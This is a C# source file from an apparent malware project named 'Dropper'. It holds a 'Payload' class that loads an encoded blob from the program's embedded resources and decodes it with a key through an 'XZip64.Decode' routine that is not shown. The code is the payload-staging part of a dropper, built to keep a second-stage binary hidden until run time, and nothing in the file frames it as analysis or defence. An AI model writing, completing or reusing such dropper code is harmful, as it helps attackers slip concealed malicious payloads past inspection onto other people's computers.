using System;
using System.IO;
using System.Reflection;

namespace Dropper
{
    class Payload
    {
        // The payload is stored in an external file ("EncodedPayload.txt") added as an Embedded Resource.
        private static readonly string payload;

        static Payload()
        {
            // Adjust the resource name if your project uses a different default namespace.
            string resourceName = "Dropper.EncodedPayload.txt";
            Assembly asm = Assembly.GetExecutingAssembly();
            using (Stream stream = asm.GetManifestResourceStream(resourceName))
            {
                if (stream == null)
                    throw new Exception("Failed to load embedded resource: " + resourceName);
                using (StreamReader reader = new StreamReader(stream))
                {
                    payload = reader.ReadToEnd();
                }
            }
        }

        public static byte[] GetPayload(string key)
        {
            if (string.IsNullOrEmpty(key))
                throw new ArgumentNullException("key");

            try {
                return XZip64.Decode(payload, key);
            }
            catch (Exception ex) {
                throw new Exception("Failed to decode payload", ex);
            }
        }
    }
}
